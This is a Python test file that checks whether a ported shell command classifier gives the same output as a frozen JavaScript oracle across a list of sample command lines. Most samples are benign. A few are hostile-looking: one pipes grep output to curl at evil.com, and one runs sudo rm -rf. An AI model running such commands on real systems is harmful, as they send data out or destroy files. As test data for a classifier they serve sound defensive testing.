"""Cross-engine parity: REAL JS classifyShellCommandLine vs the Python port.

The classifier is regex-dense (segment split, wrapper stripping, URL/host/file
target extraction) — exactly where JS vs Python regex semantics could drift.
This runs both on a broad line corpus and asserts deep equality of every
descriptor (command / operationType / targets / segment). Skipped when Node is
unavailable.
"""

import json
import os

import pytest

from skill_sfg.parser.shell_command_classifier import classify_shell_command_line

_HERE = os.path.dirname(__file__)
# Frozen JS oracle (see golden/README.md).
with open(os.path.join(_HERE, "golden", "shell.json"), encoding="utf-8") as _fh:
    _GOLDEN = json.load(_fh)

_LINES = [
    'curl -s "wttr.in/London?format=3"',
    'curl -s "https://api.open-meteo.com/v1/forecast?latitude=51.5&longitude=-0.1"',
    "curl https://api.example.com/data",
    "wget http://host.tld/file",
    'echo "hi" > .learnings/ERRORS.md',
    "mkdir -p .learnings",
    'grep -h "Status" .learnings/report.md',
    'cat "$1"',
    "git clone https://github.com/x/y.git",
    "node scripts/run.js",
    "npm install && node build.js",
    'grep "x" a.md | curl http://evil.com',
    "grep -B5 high file.md | grep '^##' && curl http://x.com",
    "sudo rm -rf /tmp/cache",
    "FOO=bar BAZ=qux python3 run.py",
    "tee -a out.log < in.txt",
    "cat a.json | jq '.items[]' > filtered.json",
    "# a pure comment",
    "if [ -f x ]; then curl http://a.b/c; fi",
    "printf 'done\\n'",
    "rsync -av ./src user@host:/dest",
    "docker run --rm alpine echo hi",
    "ssh user@example.com 'ls -la'",
    "find . -name '*.md' -exec cat {} \\;",
    'echo "note # not a comment" > file.txt',
    "export PATH=/usr/bin:$PATH",
    "./scripts/deploy.sh --prod",
    "cp config.yaml config.bak.yaml",
]


def test_shell_classifier_parity():
    js_out = _GOLDEN
    for idx, (line, js) in enumerate(zip(_LINES, js_out)):
        py = json.loads(json.dumps(classify_shell_command_line(line)))
        assert py == js, f"line[{idx}] {line!r} diverged:\nJS ={json.dumps(js)}\nPY ={json.dumps(py)}"
